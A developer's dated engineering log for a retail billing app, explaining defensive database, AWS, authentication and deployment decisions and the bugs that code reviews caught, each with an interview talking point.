- **What happened:** To confirm the RDS master user's attributes, I started RDS, then the EC2 server. EC2 refused 14 times over about 15 minutes, and again an hour later, with `InsufficientInstanceCapacity`: AWS had no spare `t4g.small` in our Availability Zone. I stopped RDS again so it wouldn't bill for nothing, and wrote the options down (wait; change the instance type in place while stopped; or move to the other zone's subnet, which replaces the server, fine because it keeps no data). The owner chose to wait: same type, same zone, retry at the next start.
- **Why / what I learned:** Stopping an instance hands its hardware back, so starting it is a new request for capacity in that same zone, and it can fail. Our stop-every-night routine trades this risk for cost. That's acceptable for a demo; for production you'd use On-Demand Capacity Reservations, more than one zone, or simply not stop the server.
- **Say it in an interview:** "Stopping EC2 to save money means starting it is a fresh capacity request. I hit InsufficientInstanceCapacity once, so my runbook has the fallbacks: another instance type in place, or another zone, which is safe because the server is stateless."

### 2026-11-19 — A restore test that ran as a superuser proved nothing for RDS `#database` `#testing` `#review`
- **What happened:** A code review of stage 7 asked how the runbook's recovery would run on RDS, as the master user. My restore test passed, but it ran as the container's superuser. When I made it restore as an administrator with only the master's rights (LOGIN, CREATEROLE, CREATEDB), it failed at once with `permission denied for database business_software`: the master may not create schemas in `app_owner`'s database, nor load tables `app_owner` owns. The fix is one flag, `pg_restore --role=app_owner` (the master may `SET ROLE` to it), and the counts are now taken as `app_backup`, as the backup itself does. RLS doesn't block the load: I checked that pg_dump writes `FORCE ROW LEVEL SECURITY` before the data but `ENABLE` and the policies after it. The drill on the server now restores as that same limited administrator.
- **Why / what I learned:** The same lesson as the RDS bootstrap bug, one level up: a test as a superuser can't see permission problems. Test as the role that will really run it, on recovery paths too, because those run under stress, when nobody has time to debug.
- **Say it in an interview:** "My restore drill used to pass as a superuser, which RDS never gives you. I changed it to restore as an admin with exactly the RDS master's rights, it failed, and the fix went into the runbook, so the path I'd use in a real recovery is the one CI tests on every push."

### 2026-11-19 — Backups you can add but never overwrite `#cloud` `#security` `#review`
- **What happened:** The review also noticed that `s3:PutObject` alone lets the server overwrite an existing backup. Versioning would keep the old copy, but our lifecycle deletes older versions after 30 days, so an attacker on the server could wipe history just by waiting. S3 now supports conditional writes: with `If-None-Match: *` a PUT fails (412) when the key exists, and a bucket policy can refuse any PUT without that header (`Null` check on the `s3:if-none-match` condition key). The backup script sends the header; the policy statement was applied on 2026-11-19 with the owner's OK ($0).
- **Why / what I learned:** "Put-only" isn't "append-only": a put can replace. Least privilege has to cover what the allowed action can do, not just which actions are allowed.
- **Say it in an interview:** "The server's only S3 right is PutObject, but that includes overwriting. A bucket policy requiring If-None-Match makes every write create-only, so even a compromised server can only add backups, never replace them."

### 2026-11-19 — Login sessions: a cookie the browser can't read, and two layers against CSRF `#security` `#backend` → ADR 0038
- **What happened:** P1.4 built login. The session cookie holds `<businessId>.<token>`: 32 random bytes, stored in PostgreSQL only as a SHA-256 hash. It is `HttpOnly`, `Secure`, `SameSite=Lax`, and has no expiry, so closing Chrome logs out. A second, 400-day "device" cookie remembers which business a counter belongs to, so staff can type just a username. Every write is refused unless it comes from our own page (`Sec-Fetch-Site`, or `Origin` as a fallback) and carries an `X-CSRF-Token` header derived from the session token. Logins are rate-limited in memory: 30 tries per IP and 10 wrong passwords per login per 15 minutes, with "try again at 14:35". At most two Argon2id hashes run at once; a flood gets `503 busy` instead of running the server out of memory.
- **Why / what I learned:**
  - **Hash the session token, like a password reset token.** A leaked backup then holds no live sessions.
  - **The business ID next to the token** means even the session lookup runs under row-level security; only login by email has to cross businesses (ADR 0039).
  - **Cookies are sent on cross-site requests; headers aren't.** A forged form on another site carries our cookie but can't read or set the CSRF header, and the browser's own `Sec-Fetch-Site` says where the request came from.
  - **`trust proxy` 1:** only Caddy's hop of `X-Forwarded-For` is trusted, so a client that sends a fake one doesn't get a fresh rate-limit counter. A test forges it.
  - **Same answer, same time:** an unknown email still runs a dummy Argon2 verify, so neither the message nor the response time says whether an account exists.
- **Say it in an interview:** "Sessions are a random token in an HttpOnly cookie with only its hash in the database, so revocation is instant and a stolen backup is useless. CSRF has two layers, a same-origin check and a per-session header, and logins are rate-limited per IP and per account with a bounded Argon2 queue."
- **Follow-ups to expect:** Why not JWT? (Lock and deactivate must work instantly on a shared computer; ADR 0009.) Why in-memory rate limits? (One API process; a second one would need them in PostgreSQL, and the ADR says so.) Can staff lock the owner out with wrong passwords? (For 15 minutes; the recovery key is the way around it.)

### 2026-11-19 — Login by email when the database hides every business `#database` `#security` `#gotcha` → ADR 0039
- **What happened:** With forced row-level security, no query sees a `users` row until the business is known, but login by email has to find the business first. The email → business mapping lives in a separate `auth` schema the app's role has no USAGE on, and the app reaches it only through `app_find_owner_login(email)`, a `SECURITY DEFINER` function that returns one business and user ID and never a password hash. Signup fills it with `app_register_owner_login`, which only sees the current business's owner, so it can't map an email to someone else's shop.
- **Why / what I learned:**
  - **`SECURITY DEFINER` runs with the owner's rights,** so an attacker who can put a table or function earlier on the `search_path` can hijack it. Each function pins `search_path = pg_catalog, pg_temp`, and a new guard rule fails any allowed definer function without the pin.
  - **A migration can't backfill under `FORCE` RLS:** it runs as the table owner, which sees no rows. Local owners from before the migration sign up again (the runbook says so).
  - **Gotchas in the guard's SQL:** `order by 1 collate "C"` fails on an integer column, and an output alias can't be used inside an `ORDER BY` expression; ordering by the full expression works.
- **Say it in an interview:** "The one query that must cross tenants is a single-purpose SECURITY DEFINER function over a schema the app can't touch, with a pinned search_path; everything after it, including the password check, runs inside that business's RLS."

### 2026-11-19 — Only the database writes an audit row's ID and time `#database` `#security` `#gotcha` → ADR 0028
- **What happened:** The owner chose D4 option A: `app_runtime` loses INSERT on `entry_log` and gets it back on eight columns only, so `id`, `business_id` and `created_at` always come from their defaults. A test-first check showed Drizzle's `insert()` now fails with `42501`, because Drizzle names every column in an insert, even ones you didn't set. `recordEntry` writes its own SQL with an explicit column list.
- **Why / what I learned:** Column-level grants are a quiet PostgreSQL feature: permissions can be narrower than a table. An ORM's convenience (naming every column) can collide with them; the test caught it before any code relied on it.
- **Say it in an interview:** "The audit log can't be backdated even by a bug in my code: the app's database role can't write the timestamp column at all."

### 2026-11-19 — The lock screen, and what "idle" means at a counter `#frontend` `#security` `#gotcha`
- **What happened:** The server locks the owner after N minutes without a request. But typing a long bill makes no request, so the server would lock a shopkeeper who was busy typing. The web app now counts key presses, clicks, scrolls and touches (not mouse movement: a bumped mouse isn't use), locks the screen itself at the same moment, and tells the server "someone is still here" at most every 30 seconds. The lock screen covers the page without unloading it, so a half-made bill survives; the page underneath is `inert` (no clicks, no Tab), and keyboard shortcuts are paused, because `inert` doesn't stop a listener on `window`.
- **Why / what I learned:** The server's clock is the one that counts (a sleeping laptop can't skip it); the browser only keeps the screen in step. "Lock now" covers the screen before telling the server, so a slow connection never leaves the counter open. After logout the app clears every cached query, so the next user never sees the last one's data.
- **Say it in an interview:** "Idle is enforced on the server, but measured from what the person does, not from network traffic, with a throttled heartbeat. The lock overlay keeps the page's state, marks it inert and pauses global shortcuts, which inert alone doesn't."

### 2026-11-19 — Updating a published branch after a rebase, without force-pushing `#git` `#process`
- **What happened:** The P1.4 branch had one design commit on GitHub. I rebased it locally onto the new `main`, and the push was refused, as it should be. Force-pushing needs the owner's OK, so I ran `git merge -s ours origin/feat/p1.4-login`: a merge commit that records the published commit as included but keeps my files exactly as they are. A normal push then worked.
- **Why / what I learned:** `-s ours` (the strategy, not the `-X ours` option) takes nothing from the other side; it only joins the histories. With squash merges, that extra merge commit disappears at merge time anyway.
- **Say it in an interview:** "When my local branch diverged from its published copy, I joined the histories with an 'ours' merge instead of force-pushing, so nobody's copy of the branch broke."

### 2026-11-19 — A code review of the login: races, a cached failure, and what "activity" means `#security` `#backend` `#review` `#bug`
- **What happened:** A review of PR #33 found nine issues; all were real except that two were the same design question, and each fix has a test.
  - **Check-then-count is a race.** The wrong-password limit was checked before the slow Argon2 verify and counted after it, so 22 guesses sent at once all passed the check. Now each try is counted first (a right password takes it back); 22 at once get 10 checks and 12 refusals.
  - **A cached rejected promise.** The stand-in hash for unknown emails was cached as a promise made inside the busy-limited queue. One busy moment cached a rejection (every later unknown-email login answered 503 until a restart), and when nobody awaited it, it was an unhandled rejection that can stop Node. Now it's made outside the queue, only when needed, and a failure clears the cache.
  - **"Activity" was any request.** A tab refetching on focus kept the owner's screen from locking. Now only a write that passed the CSRF check counts, plus the web app's "still here" ping. The ping goes out on the first key press after a quiet spell, and the server allows a minute of grace (more than the 30-second gap between pings), so it never locks before the screen does.
  - **Logged out by a failure.** Login ended the old session in one transaction and started the new one in another. Now both happen in one, even across two businesses: a new `alsoInBusiness` helper switches the RLS business inside a transaction and back. Signup now ends the old session too.
  - **Smaller ones:** signup hashed outside the shared Argon2 queue; the guard was wired twice (production and test); an unused `@Passive()` decorator.
- **Why / what I learned:** For anything rate-limited around a slow step, reserve before the slow step, never check-then-count. Never cache a promise that can reject unless the rejection clears the cache. And define "activity" from what a person does, not from what the network does.
- **Say it in an interview:** "A review caught a classic check-then-act race in my login limit: concurrent guesses all passed the check before any was counted. I moved the count before the slow hash, and proved it with 22 simultaneous requests. It also caught a cached rejected promise that would have broken every unknown-email login after one busy moment."

### 2026-11-19 — A new schema broke the backup, as designed `#database` `#devops` `#testing`
- **What happened:** Login (P1.4) added schema `auth` with `owner_logins`, the email → business map that login by email needs, kept outside RLS and away from the app role. Merging it into the backup branch, the backup test failed at once: `pg_dump: permission denied for schema auth`. That's the behaviour I chose in ADR 0037: a schema the backup role can't read stops the backup, instead of being silently left out. I granted `app_backup` read access to `auth` in the backup migration (renumbered to 0007 because P1.4 took 0006) and made the restore test check that both test owners' logins come back, joined to the right business and user.
- **Why / what I learned:** A backup that skips what it can't read looks fine until the restore, when every owner is locked out. Failing loudly turned that into a red test on the day the schema arrived.
- **Say it in an interview:** "My backup refuses to run if there's anything it can't read. When a later feature added a new schema, CI went red on the backup test the same day, not on the day I needed a restore."

### 2026-11-19 — Telling a barcode scanner from a person typing `#frontend` `#gotcha`
- **What happened:** A USB scanner is a keyboard: it "types" the code and presses Enter. The Items page opens a scanned item when no field is focused, so it has to tell a scan from someone pressing keys. A scanner sends each key a few milliseconds apart; people take 100 ms or more. The page keeps a buffer that empties after any gap over 50 ms and counts only four or more printable characters ended by Enter. The first version reset the buffer on Shift, which scanners press for every capital letter, so codes with letters would never scan; a test caught it before the page used it.
- **Say it in an interview:** "A scanner is a fast keyboard, so I detect scans by timing: a burst of keys a few milliseconds apart ending in Enter. The logic is a small class with tests that feed it timestamps, so it's tested without a real device."

### 2026-11-19 — Optimistic locking undone by the browser's own cache `#frontend` `#bug` `#review`
- **What happened:** The item form sends back the `version` it was loaded at, so the server can answer `409 stale` if someone else saved first. A review found the form read the version from the query cache instead of from when its values were loaded. TanStack Query refetches when the window regains focus, and adding a barcode also writes a fresh copy into the cache. Either can bring someone else's newer version, and the next save would carry it and silently overwrite their change. The form now keeps the loaded version in a ref and updates it only when the form itself is reset from a save.
- **Why / what I learned:** The version must travel with the values it describes. A cache that updates itself in the background is exactly what makes a separate "latest version" wrong.
- **Say it in an interview:** "Optimistic locking only works if the version you send is the one your edits started from. My form kept it next to the values, not in the live cache, after a review showed a focus refetch could defeat the check."

### 2026-11-19 — A scanner's keys and keyboard shortcuts share one keyboard `#frontend` `#gotcha` `#review`
- **What happened:** `/` focuses the item search. A code containing `/` scanned with nothing focused triggered it mid-scan, so the rest of the code went into the search box. The scanner's listener now runs in the capture phase, before the shortcut registry, and stops any key that continues a burst already under way. The first test passed for the wrong reason: it fired every key at the page body and without the physical key code, so the shortcut never matched; the helper now sends keys to whatever has focus, with their codes, as a keyboard does.
- **Say it in an interview:** "Scanners type through the keyboard, so shortcut keys can appear inside a barcode. I give the scanner first look at each key, and a key that continues a fast burst belongs to the scan."

### 2026-11-19 — What a real-app check finds that tests don't `#frontend` `#testing`
- **What happened:** After the tests and CI were green, I signed up a test business on my own database, logged in and used the Items page in Chrome: shortcuts, a simulated scan, prices and margin, errors in three languages, barcodes, archive and restore, light and dark, 1024 px. Everything worked, and the rows and entry log matched. It still found three wording problems no test could: a "Show archived" box that actually shows only archived items, a card promising packs that a kirana's settings hide, and one language missing the "Branch:" prefix the others had. Each got a test with the fix.
- **Why / what I learned:** Tests check what I thought to ask; using the page as a shopkeeper checks what I didn't. A label that describes the code instead of the behaviour passes every test.
- **Say it in an interview:** "Green CI isn't done. I use every feature once in a real browser against a real database before calling it finished, and anything I find becomes a test."

### 2026-11-19 — Continuous deployment: test the exact image, and make the hold fail closed `#devops` `#cicd` `#security`
- **What happened:** Stage 6 built the deploy pipeline. The images workflow now builds both ARM64 images into the runner's Docker, runs the same smoke test CI runs, and only then pushes them, so the image on the Graviton server is the one that was tested (CI's smoke job tests x86 builds). A new deploy workflow waits for the owner's approval in a protected GitHub environment, gets one-hour AWS credentials through OIDC for a role that may only run commands on that one server, notes the running release, takes a backup, deploys over Systems Manager, checks the live site, and redeploys the previous release if the deploy or the check fails. The same scripts run on my laptop and on the Linux runner; I tested them on both against a fake AWS CLI before any AWS change.
- **Why / what I learned:** My design said "the deploy runs while `DEPLOY_HOLD` is empty". Writing it, I saw that a merge before anyone set up the environment would find the variable empty and deploy. The hold now fails closed: only the exact text `off` lets a deploy through, and unset means held. Safety switches should default to the safe side.
- **Say it in an interview:** "Every merge builds and smoke-tests the ARM64 images and pushes exactly those. Deploying needs my approval, uses short-lived OIDC credentials scoped to one server, takes a backup first, and rolls back automatically. The deploy hold fails closed, so a missing setting can never mean 'go'."

### 2026-11-20 — Running three tasks in parallel, and what it cost `#process` `#mistake`
- **What happened:** Day 3 ran three lanes as background agents, each in its own git worktree and branch, with one merge queue. Four PRs merged (P1.7 twice, P1.4, stage 7), plus the sitting-2 docs. The 5-hour usage limit stopped all three lanes three times; each resumed where it stopped, but once an RDS start was left in flight and the lane had to stop it after resuming. A `code-review` on every PR found 39 real problems that green CI had missed.
- **Why / what I learned:** parallel work multiplies cost as well as speed, so size it to the real budget (two or three lanes), and check cloud state after any interruption. Review is the step that finds the bugs tests didn't think of; it isn't optional when four branches land in a day.
- **Say it in an interview:** "I ran three features in parallel with worktrees and a strict merge queue: each PR reviewed, then merged one at a time, with the next one updating from main and renumbering its migration."

### 2026-11-20 — A permission check stopped an approved `terraform apply` `#devops` `#process` `#gotcha`
- **What happened:** The owner approved the stage 7 apply, but the background lane's `terraform apply` was blocked by Claude Code's permission check (an agent can't inherit a chat approval). The main session showed the saved plan (10 to add, 0 change, 0 destroy), applied that exact plan file, and later re-planned before applying the S3 policy change (1 to change). The AWS sign-in had also expired after 12 hours; the owner ran `aws login` again.
- **Why / what I learned:** apply a saved plan file, never a fresh `apply` that re-plans: what the owner approved is exactly what runs. Plan in the worker, apply from the place the approval was given.
- **Say it in an interview:** "Plans are reviewed as files and the same file is applied, so nothing changes between approval and apply."

### 2026-11-20 — Checking the GST rate list after GST 2.0 `#domain` `#research`
- **What happened:** P1.7 accepts the rates 0, 0.25, 3, 5, 18 and 40%. Since 22 September 2025 (Notification 9/2025, after the 56th GST Council), the main slabs are 5% and 18%, with 40% for luxury and demerit goods, 3% for precious metals and 0.25% for rough diamonds; 12% and 28% are gone for goods. Secondary sources disagree on a 1.5% rate (polished diamonds) versus 1.5% as the CGST half of 3%.
- **Why / what I learned:** tax rates change by notification, so the app checks a rate is on today's list but not that an HSN code carries it (G1). The 1.5% question stays open until checked against CBIC's own notification, before the billing screen.
- **Say it in an interview:** "The GST rate list is data that changes by government notification, so it's one constant with its source, checked against the notification, not spread through the code."

### 2026-11-20 — Stock as an append-only ledger plus a running total `#database` `#design` → ADR 0007
- **What happened:** P1.8's design keeps stock in two tables: `stock_movements`, where every change is a new row the app can never edit or delete (who, when, why, quantity, cost, balance after), and `item_stock`, one row per item per branch holding the current quantity and average cost. One helper, `moveStock`, is the only code that writes either, inside the same transaction as the entry log row. A test checks after every stock test that the total equals the sum of the movements.
- **Why / what I learned:** the ledger is the truth and the history; the total exists so billing doesn't add up years of rows on every scan, and so two counters have one row to queue on. A mistake is fixed with a new movement, never by changing an old one. I chose app code over a database trigger to keep the two in step, because the code must also control lock order across a whole bill and give the counter a clear refusal.
- **Say it in an interview:** "Stock is a ledger, not a number I overwrite. Every change is an insert-only row, and a running total is updated in the same transaction under a row lock. If the total and the ledger ever disagree, a one-line query shows it."

### 2026-11-20 — Two counters, one item: row locks taken in a fixed order `#database` `#concurrency` → ADR 0007
- **What happened:** When two counters sell the same item at the same branch, both transactions lock that item's `item_stock` row (`select … for update`), so the second waits a few milliseconds and then sees the first one's result. Locks are always taken in item-ID order, so a bill with X and Y and another with Y and X can't deadlock. I compared this with `SERIALIZABLE` (correct, but a clash fails the whole bill and it must be retried) and advisory locks (not tied to a row, so a forgotten one fails silently).
- **Why / what I learned:** deadlocks come from two transactions locking the same things in different orders; a fixed order removes them. Lock the narrowest thing that protects the rule: one item at one branch, not the whole stock table.
- **Say it in an interview:** "Concurrent sales lock only the stock rows they touch, always sorted by item ID. My test runs twenty parallel adjustments on one item and checks the result is exact, and another runs two transactions in opposite order to prove there's no deadlock."

### 2026-11-20 — Timeouts so one stuck request can't freeze every counter `#database` `#reliability` → ADR 0041
- **What happened:** Without limits, a request waiting on another counter's lock, or a transaction a bug left open, waits for ever and holds one of the pool's 10 connections. P1.8 sets three PostgreSQL limits on the app's connections: `lock_timeout` 3 s, `statement_timeout` 10 s and `idle_in_transaction_session_timeout` 15 s. A lock timeout answers `503 busy` with `Retry-After`, and the screen retries once with the same idempotency key, so a retry can't move stock twice. They are sent as connection start-up options from the code, not set on the database role, so there's no hand-run step on RDS and a test reads them back.
- **Why / what I learned:** a pool is a small shared resource; anything that can wait for ever eventually takes all of it. Fail fast with a clear, retryable error instead.
- **Say it in an interview:** "Every app connection has a lock timeout, a statement timeout and an idle-in-transaction timeout. A counter that loses a lock race gets a 503 and retries safely with its idempotency key, instead of hanging and starving the pool."

### 2026-11-20 — An idempotency key that lost to its own rules `#backend` `#concurrency` `#review` `#bug`
- **What happened:** The stock API checks a request's key before moving stock, and a unique index on the key is the backstop when two copies arrive together. The review of PR #38 found a gap: the second copy waits on the item's row lock, then reads the stock the first copy just wrote, so a rule (opening stock already set, or a write-down past zero) refused it with a 409 before its insert could hit the unique index. The counter would show an error for a save that worked. The fix: when a rule refuses, look for a committed movement with the same key in a fresh transaction and answer it. A test sends five copies of an opening and of a write-down to exactly zero.
- **Why / what I learned:** an idempotency check before a lock is only a fast path; the truth is what's committed after the lock. Every way the second copy can fail (key collision or a business rule) must fall back to "did the first copy already do this?".
- **Say it in an interview:** "Retries carry the same key. A duplicate that waited on a row lock can fail a business rule because the first copy already changed the data, so on any refusal I re-check for the committed result of that key before answering an error."

### 2026-11-20 — Email with no secret anywhere: one interface, four ways out `#backend` `#cloud` `#security` → ADR 0040
- **What happened:** P1.4's password reset and email confirmation are the first emails the app sends. One `Mailer` interface has four implementations, picked by `MAIL_TRANSPORT`: Amazon SES through the AWS SDK on the server (signed by the instance role), Mailpit over SMTP on the laptop (a container with a web inbox at `127.0.0.1:8025`), a no-op that only logs the subject, and a fake in tests. The Pricing API gave SES in Mumbai: $0.0001 per recipient, $0.10 per 1,000. Without a domain (D1), SES stays in its sandbox: only verified addresses receive mail, so the recovery key is the guaranteed way back in and the screen says so.
- **Why / what I learned:** SES's SMTP interface would have needed an SMTP password derived from an access key, a long-lived secret; the SDK with the instance role needs none. Emails are sent after the transaction commits and a failure is only logged, so a mail outage can't undo a password change. The body is never logged because it holds a one-time link.
- **Say it in an interview:** "Business code calls one Mailer interface; production uses SES with the server's IAM role, so there's no email credential to leak, local development catches everything in Mailpit, and tests read a fake. Without a domain SES stays sandboxed, so the recovery key is the fallback and the UI says so."

### 2026-11-20 — Two parallel branches both made migration 0007 `#database` `#git` `#process`
- **What happened:** P1.4 PR 2 was written as migration `0007_auth_tokens` while stage 7 merged its own `0007_backup_read_policies`. Drizzle numbers migrations and keeps a snapshot chain, so two 0007s can't both exist. The fix, without rewriting history: merge `main` into the branch, take `main`'s journal and snapshot, `git rm` our never-merged migration, and run `drizzle-kit generate` again, which produced `0008` from the schema. The regenerated file also gained the `backup_read` policy for the new table, because `main` had changed the schema helper to `tenantPolicies()`; only the hand-written `FORCE ROW LEVEL SECURITY` line and the comment had to be added back. The locale files conflicted too; a small deep-merge script took both sides and reported zero keys with two different values.
- **Why / what I learned:** a migration is generated from the schema, so it's regenerated after a merge, never hand-renumbered; the hand-written lines are the only part to carry over by hand. Generated files (migrations, the route tree) are rebuilt, not merged line by line.
- **Say it in an interview:** "With parallel branches, migrations are only generated at merge time: the second branch takes main's migration history, drops its own unmerged file and regenerates, so numbers stay in order and nothing on main is ever edited."

### 2026-11-20 — A fake key in a test failed the secret scan `#security` `#testing` `#gotcha`
- **What happened:** tests used a made-up recovery key written out as one string (`ABCD-EFGH-…`). gitleaks' `generic-api-key` rule flagged it because the variable was named like a key and the value looked random enough, which failed CI's `secrets` job. The first fix was three fingerprints in `.gitleaksignore`, but a fingerprint names the commit, so every new commit with the same line would fail again. The lasting fix: a helper builds the key at run time from the alphabet, so no literal key-shaped string exists in the source. Checked with the same pinned gitleaks image over the changed files: no leaks.
- **Why / what I learned:** secret scanners match on shape and on nearby words like `key`, not on whether the value is real. Ignore lists by fingerprint fit one old commit; for code that keeps changing, change the code so it no longer looks like a secret.
- **Say it in an interview:** "Our CI scans every commit for secrets; a fake key in a test tripped it. Rather than keep adding ignore entries, I build test keys at run time so nothing in the source looks like a credential."

### 2026-11-20 — "Mark the old one used, then insert" races itself `#database` `#bug` `#review` `#security`
- **What happened:** a review of P1.4 PR 2 (#37) found that issuing a new reset link ran two statements: mark the user's open link used, then insert the new one, with a partial unique index allowing one open link per user. Four reset requests sent at once gave `202, 202, 500, 500`. Under READ COMMITTED, the second transaction's UPDATE can't see the first one's uncommitted row, so its INSERT fails the unique index. The 500 also gave away that the email had an account, since an unknown email always gets 202. "Make a new recovery key" had the same pattern (`500, 200, 200, 200`). The fix is one line in each place: `select … from users where id = $1 for update` first, so requests for the same user queue behind each other. The same review found that a reset link asked for before a password change kept working afterwards, so `setPasswordIn` now also ends any open reset link. Both were written as failing tests first.
- **Why / what I learned:** a unique index is the safety net, not the plan. When "replace the current one" takes two statements, lock something both transactions must touch, and the user's row is the natural one. And every way of changing a password must also cancel the other ways of changing it that are still in flight.
- **Say it in an interview:** "Two concurrent reset requests both tried to replace the open link and the second hit the unique index, a 500 that also leaked that the account existed. I serialized them with a row lock on the user, proved it with a test that fires four requests at once, and made every password change cancel any outstanding reset link."

### 2026-11-20 — Five ways a deploy pipeline can go wrong that a happy-path test never shows `#devops` `#cicd` `#review`
- **What happened:** A code review of the stage 6 deploy workflow found problems that only show up when things happen in an unusual order:
  - **Out-of-order deploys.** Two merges close together start two image builds; if the older one finishes last, its deploy would take the server back. The deploy now asks git whether the commit is an ancestor of the running release and refuses (`git merge-base --is-ancestor`), unless a person runs it by hand as a rollback.
  - **A timeout that skips the rollback.** A job timeout *cancels* the job, and a cancelled job skips `if: failure()` steps, so the safety net vanished exactly when the deploy hung. Each slow step now has its own limit (a step that hits it *fails*, which the rollback sees) and the job's limit sits above the worst case.
  - **A skipped run replacing a real one.** Concurrency was set on the whole workflow, so a run whose job was skipped still joined the queue and could replace a deploy waiting for approval. It's on the job now.
  - **Rolling back to the commit that just failed.** On a rerun of the running release, "previous" equals "current", and the rollback would redeploy the broken commit and report it live.
  - **A "previous release" file that lies after a rollback.** After rolling back, the file named the failed release. I removed it: the workflow reads the running release itself, and each run is named after its commit.
- **Why / what I learned:** the logic in these scripts is testable without AWS. `scripts/deploy/test.sh` builds a throwaway git repository and a fake `curl`, and checks the commit rules and the live-check retries in CI.
- **Say it in an interview:** "My deploy never goes backwards by accident: it checks the commit graph against what's running. I learned that a job timeout cancels instead of failing, which silently skips a rollback step, so I put limits on each step instead."

### 2026-11-20 — What a narrow IAM role can really reach `#security` `#aws`
- **What happened:** The deploy role may only call `ssm:SendCommand` with `AWS-RunShellScript` on one server. I first described that as "no S3, no secrets". A review pointed out that the command runs as root on the server, and the server's own role can read the SSM secrets and write to S3. So the deploy role can reach both, one hop away. I corrected the comment and ADR 0012. The real boundary is who can get the role's credentials: only a job in the `demo` GitHub environment, after my approval, running code from `main`. A custom SSM document wouldn't narrow it much, because the deploy runs code from `main` as root anyway.
- **Why / what I learned:** count what a principal can do *through* the things it controls, not just its own policy.
- **Say it in an interview:** "A role that can run commands on a server has everything that server's role has. I documented that honestly and put the real control where it is: an approval gate and a protected branch."

### 2026-11-20 — The second review: credentials expire, and "stopped waiting" isn't "stopped" `#devops` `#cicd` `#review` `#aws`
- **What happened:** A second review of the fixed deploy workflow found eight more problems. The three I'd tell in an interview:
  - **Credentials outlive nothing.** The OIDC credentials last one hour, but the worst-case job runs longer, so a late rollback would have run on expired credentials. The rollback now asks for fresh ones.
  - **My script stopped waiting, but the server didn't stop running.** `run_on_server` polled a fixed number of times. A command could still be running on the server when it gave up, and the rollback would then start a second install on top of the first. Now the wait has a deadline that covers both delivery and the command's own limit, and the rollback first waits for the failed deploy's command by its ID.
  - **Retrying every error hides the real one.** The poll loop swallowed every AWS error, so an expired token looked like a 15-minute hang. It now retries only "not there yet" and throttling, and prints any other error at once.
  - Also fixed: no deploy without a fresh backup unless I tick a box on a run by hand, no rollback when nothing reached the server, and `release.env` put back when a release never comes up.
- **Why / what I learned:** a remote command has its own life. Timing out on my side says nothing about the other side, so wait on the remote state, and retry only the errors that are known to pass.
- **Say it in an interview:** "Before my rollback starts, it waits for the failed deploy's command on the server to finish, so two installs can never overlap. It also gets fresh short-lived credentials, because the first ones may have expired by then."

### 2026-11-20 — A lockout is a denial of service: limit recovery by IP, not by account `#security` `#backend` `#gotcha` `#review`
- **What happened:** the approved design limited recovery-key attempts to 5 per IP and 5 per email an hour. The review of #37 pointed out that the per-email half lets anyone who knows the owner's email send 5 wrong keys from anywhere and block the real owner's recovery for an hour. That breaks Module 00 #41: the key "always gets the owner back in". The owner chose to drop the per-email limit for recovery-key tries only. A test first showed the attack (12 wrong keys from 12 IPs, then the owner's right key got `429`), and after the change the owner gets `200`, while one IP is still stopped at its 6th try. A second review of that change found the per-IP limit could lock the owner out too. It was shared with reset-link requests, so an owner who pressed "send link" five times could no longer use the key. And in India many people share one public IPv4 address (carrier-grade NAT). Now recovery keys have their own count per IP, only wrong keys count, and a right key is never refused and clears the count.
- **Why / what I learned:** a limit keyed by account protects a weak secret from many guessers, at the price of letting a stranger lock that account. That trade is right for a password (people pick weak ones; login also has the recovery key as a way out) and wrong for a 160-bit random key that can't be guessed anyway, where the account limit only adds an attack. A limit keyed by IP slows one machine, but it can still hurt whoever shares that IP, so for a secret that can't be guessed, count only failures and never refuse the right answer. Reset-link requests keep their per-email limit, because each one sends an email and the limit stops someone flooding a mailbox.
- **Say it in an interview:** "Rate limits per account turn into a denial-of-service if a stranger can trigger them. For a 160-bit recovery key, guessing is already hopeless, so I limited it by IP only, with a test proving an attacker who knows the email can't lock the owner out."

### 2026-11-20 — A test that passed on my laptop and failed in CI: the fake server never logged out `#testing` `#frontend` `#cicd` `#gotcha`
- **What happened:** the test "forgetting this computer goes to the login page" passed locally and failed in CI with "expected '/' to be '/login'". After forgetting, the app clears its cache and opens `/login`; the login page then re-reads the session and sends anyone still logged in to `/`. The test's fake API kept answering "logged in", so the result depended on timing. On my laptop the check ran before the re-read came back; on the slower CI runner it ran after. The app was right; the fake wasn't. Now the fake does what the real server does: after `POST .../forget` the session answers `none` and Settings answers `401`. The test waits for the "Log in" heading.
- **Why / what I learned:** a fake must change state the way the real server does. If a test only passes because it checks before a background request returns, it's a race, and CI's slower machines are where races show up.
- **Say it in an interview:** "A green test on my machine and a red one in CI usually means a race. Mine was in the test's fake server, which never ended the session, so I made the fake follow the real server's rules instead of adding waits."

### 2026-11-20 — 1.5% is a real GST rate, not half of 3% `#gst` `#research`
- **What happened:** before the billing screen, I checked the open question from P1.7 against the notification itself. Notification 9/2025-Integrated Tax (Rate) (in force 22 Sept 2025) charges IGST at 1.50% on its Schedule VI, which holds HSN 7102 diamonds other than rough ones (cut and polished); rough diamonds are Schedule V at 0.25%. The Central Tax version of the same notification lists 0.75% for Schedule VI, which is why some blogs called "1.5%" a half rate. The full rate is 1.5% (CGST 0.75% + SGST 0.75%). The P1.13 design recommends adding it to `GST_RATES`.
- **Why / what I learned:** a CGST notification shows half the rate and the IGST notification shows the whole rate, so a number in a secondary source can be either. Read the IGST notification for the total. The engine already handles odd halves (it divides by twice the base), so 1.5% needs one constant and a regenerated check constraint, not new maths.
- **Say it in an interview:** "I checked my GST rate list against the government notification, not tax blogs. The blogs disagreed because the central-tax version shows half the rate; the integrated-tax version showed 1.5% was a full rate I'd left out."

### 2026-11-20 — Syncing "what changed since" misses late commits; ask with an overlap `#database` `#frontend` `#gotcha` → P1.13 design
- **What happened:** the billing screen keeps a copy of the catalogue in the browser so a scan never waits for the network (NFR 5, under 200 ms). It refreshes by asking the server for items changed since its last sync time. But `updated_at` is stamped when a change is made, and other counters only see it when its transaction commits. A change made at 10:00:00.9 and committed at 10:00:01.2 is invisible to a sync at 10:00:01.0, and the next sync, asking for "after 10:00:01.0", skips it for good.
- **Why / what I learned:** a timestamp cursor over rows written by concurrent transactions isn't exact. The fix is an overlap longer than any transaction can stay open (the database ends idle transactions after 15 s and slow statements after 10 s, ADR 0041), so each sync asks for "changed since 60 s before my last sync", replaces duplicates by ID, and a full reload every 30 minutes heals anything missed. The server also re-prices every line when the bill is saved, so a stale copy can only cause a "prices changed" prompt, never a wrong bill.
- **Say it in an interview:** "Incremental sync by `updated_at` loses rows whose transaction commits after the cursor moves past them. I sync with a 60-second overlap that's longer than my database's transaction timeouts, dedupe by ID, and the server stays the source of truth at save."
